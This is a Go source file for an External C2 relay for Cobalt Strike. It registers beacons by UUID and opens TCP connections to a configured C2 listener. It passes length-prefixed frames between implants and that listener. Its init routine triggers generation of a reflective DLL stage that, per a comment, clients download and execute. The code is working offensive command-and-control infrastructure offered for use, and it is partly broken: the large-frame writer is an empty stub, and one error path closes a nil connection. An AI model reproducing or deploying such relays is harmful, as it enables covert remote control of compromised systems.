package ExternalC2Go

import (
	"encoding/binary"
	"github.com/google/uuid"
	"github.com/pkg/errors"
	"io"
	"log"
	"net"
	"strings"
)

const BEACON_MAX_LEN = 1024 * 1024

var (
	DEFAULT_BLOCK = 100

	// EC2 (CobaltStrike) Listener information
	EC2_HOST = ""
	EC2_PORT = ""

	//GLOBAL Error Chan
	ErrChan = make(chan error)
	// Global channels for incoming and outgoing requests
	ServerInbound  = make(chan EC2Message)
	ServerOutbound = make(chan EC2Message)

	// Global map for all EC2Objects
	EC2Map = make(map[uuid.UUID]EC2Object)
)

// Create an object that will represent one connection for one beacon to the C2 server
type EC2Object struct {
	UID             uuid.UUID
	Connected       bool
	BlockTimeMillis int
	Conn            net.Conn
}

// this will be the actual message objects we are passing to/from the server
type EC2Message struct {
	IsInit             bool
	Length             uint32
	LengthLittleEndian []byte
	Contents           []byte
	OriginID           uuid.UUID
}

func NewEC2Object(connected bool, blockTimeMillis int, conn net.Conn, uid uuid.UUID) *EC2Object {
	return &EC2Object{Connected: connected, BlockTimeMillis: blockTimeMillis, Conn: conn, UID: uid}
}

func NewEC2Message(contents []byte, uid uuid.UUID) *EC2Message {
	retVal := new(EC2Message)
	retVal.Contents = contents
	retVal.IsInit = false

	retVal.Length = uint32(len(contents))

	retVal.OriginID = uid
	// 32 bit size
	tmpSize := make([]byte, 4)
	binary.LittleEndian.PutUint32(tmpSize, retVal.Length)
	retVal.LengthLittleEndian = tmpSize
	return retVal
}

func Stop(){
	log.Println("[i] Stopping listeners")
	for k := range EC2Map{
		EC2Map[k].Close()
	}
}

// continually listens for messages
// once a new message is received, a goroutine is started that will write the
// response to the outgoing messages channel
//
// Any module using this ExternalC2 should implement
// ideally the same function for inbound messages
func listen() {
	log.Printf("[i] Started Message dispatching goroutine...\n")

	// forever
	for {
		// check the message inbound queue for a new message
		top := <-ServerInbound

		// dispatch the request to the appropriate handler
		if top.OriginID.ID() != 0 {
			log.Println("[i] Starting dispatch thread")
			go dispatch(top)
		}
	}
}

// Checks the global map of active beacons
// if one isn't found, one is created and started
func dispatch(m EC2Message) {
	// for readability
	var ec2 EC2Object
	var found bool

	// look in the global map of ec2 objects (connection instances to CobaltStrike)
	// if it's not in our map, it's a new beacon
	if ec2, found = EC2Map[m.OriginID]; !found {
		log.Printf("[+] GOT NEW BEACON REQUEST FROM %s\n", m.OriginID.String())

		// make a new EC2 Object
		newBeacon := NewEC2Object(false, DEFAULT_BLOCK, nil, m.OriginID)

		// start it
		newBeacon.Start()

		// add it to our beacon map
		EC2Map[m.OriginID] = *newBeacon
		m.IsInit = true

		// finally, send the message
		newBeacon.SendMessage(m)
	} else {

		// it's a beacon we already know, send the message
		ec2.SendMessage(m)
	}
}

// continually listens for errors
func handleErrorChan() {
	log.Println("[i] Starting error channel thread")

	dummy := errors.New("")
	for {
		if peek := <-ErrChan; strings.Compare(dummy.Error(), peek.Error()) != 0 {
			log.Println(peek)
			dummy = peek
		}
	}
}

// starts the dispatching threads
func Init(ec2host, ec2port string) {
	EC2_HOST, EC2_PORT = ec2host, ec2port
	log.Printf("[i] STARTING ERROR AND MESSAGE CHANNELS")
	go handleErrorChan()
	go listen()
}

// This function expects a single, populated EC2Message object
// This function will prepare the frame writes automatically, do not use this
// to send the sized payload in stages
//
// The response to this message will be put in the ServerOutbound channel
// for processing by the server
func (eo *EC2Object) SendMessage(m EC2Message) {
	// if the beacon is sending it's first association frame
	if m.IsInit {
		log.Println("[d] SendMessage: Calling HandleInit")
		eo.HandleInit(m)
	} else {
		// otherwise it's a beacon we already sent a stage to
		log.Println("[d] SendMessage: Calling writeMessage")
		eo.writeMessage(m)
	}
	log.Println("[d] SendMessage: Calling readMessage (new thread)")
	eo.readMessage()
}

func (eo *EC2Object) HandleInit(m EC2Message) {
	data := strings.Split(string(m.Contents), "|")
	if len(data) != 3 {
		log.Println("[i] Ignoring beacon, got comms before init, did you restart the server? Stale client?")
		return
	}
	archStr := data[0]
	pipeStr := data[1]
	blockStr := data[2]

	// make new messages for each of them as they have to be sent one at a time
	archMsg := NewEC2Message([]byte(archStr), m.OriginID)
	pipeMsg := NewEC2Message([]byte(pipeStr), m.OriginID)
	blockMsg := NewEC2Message([]byte(blockStr), m.OriginID)

	archMsg.IsInit = true
	pipeMsg.IsInit = true
	blockMsg.IsInit = true

	eo.writeMessage(*archMsg)
	eo.writeMessage(*pipeMsg)
	eo.writeMessage(*blockMsg)

	// after the initial data is written, the word "go"
	// must be sent as a frame to the EC2 Server
	// this will trigger the generation of the Reflective DLL artifact that will be downloaded and
	// executed by each client
	initMsg := NewEC2Message([]byte("go"), m.OriginID)
	eo.writeMessage(*initMsg)
}

func (eo *EC2Object) readMessage() {
	LittleEndianSize := make([]byte, 4)

	_, err := eo.Conn.Read(LittleEndianSize)
	log.Println("[d] READ MESSAGE LENGTH")
	if err != nil {
		if err != io.EOF {
			log.Println(err)
		}
		ErrChan <- err
	}
	uint32Size := binary.LittleEndian.Uint32(LittleEndianSize)

	log.Printf("[+] READ FRAME FROM CONNECTION")
	log.Printf("[i] FRAME SIZE: %d\n", uint32Size)

	var buf []byte
	TotalBytesRead := uint32(0)

	for TotalBytesRead < uint32Size {
		tmp := make([]byte, uint32Size)
		n, err := eo.Conn.Read(tmp)
		if err != nil {
			log.Printf("[-] Couldn't read buffer from pipe with error: %v\n", err)
			ErrChan <- err
		}
		// if we got it in one buffer read pass
		if uint32(n) == uint32Size{

			// send it
			log.Println("[+] Sending EC2 Message to Server Outbound")
			ServerOutbound <- *NewEC2Message(tmp, eo.UID)
			return
		}


		TotalBytesRead += uint32(n)

		buf = append(buf, tmp[0:n]...)
	}
	log.Println("[+] Sending EC2 Message to Server Outbound")
	ServerOutbound <- *NewEC2Message(buf, eo.UID)
}

func (eo EC2Object) Close() {
	eo.Conn.Close()
}

func (eo EC2Object) multiWrite(m EC2Message){
	log.Println("[i] Splitting large frame into small frames")


}

func (eo *EC2Object) writeMessage(m EC2Message) {
	if m.Length > BEACON_MAX_LEN {
		eo.multiWrite(m)
		return
	}

	// first  write the 4B size
	log.Printf("[d] ** Sending Size Frame: %v\n", m.LengthLittleEndian)

	nSent, conErr := eo.Conn.Write([]byte(m.LengthLittleEndian))

	// if we get an error send it to the error chan and log it
	if conErr != nil {
		ErrChan <- conErr
		log.Println(conErr)
		return
	}

	if nSent != len(m.LengthLittleEndian) {
		log.Printf("[-] Sent longer data than the frame length of 4B?: len - %d\n", nSent)
	}

	nSent, conErr = eo.Conn.Write(m.Contents[:m.Length])
	if conErr != nil {
		ErrChan <- conErr
		log.Println(conErr)
		return
	}

	if nSent != len(m.Contents) {
		log.Printf("[-] Sent longer data than the frame data of len - %d, actual %d\n", nSent, len(m.Contents))
	}
}

// Start *must* be called before the EC2Object can be used
func (eo *EC2Object) Start() {
	log.Println("[i] Opening connection to External C2")
	log.Printf("[i] Openingto %s:%s\n", EC2_HOST, EC2_PORT)

	if TestConn, ConErr := net.Dial("tcp", EC2_HOST+":"+EC2_PORT); ConErr != nil {
		log.Println("[--] Critical, cannot connect to external c2 listener")
		ErrChan <- ConErr
		defer TestConn.Close()
	} else {
		log.Println("[+] Connected to External C2")
		eo.Connected = true
		eo.Conn = TestConn
	}
}

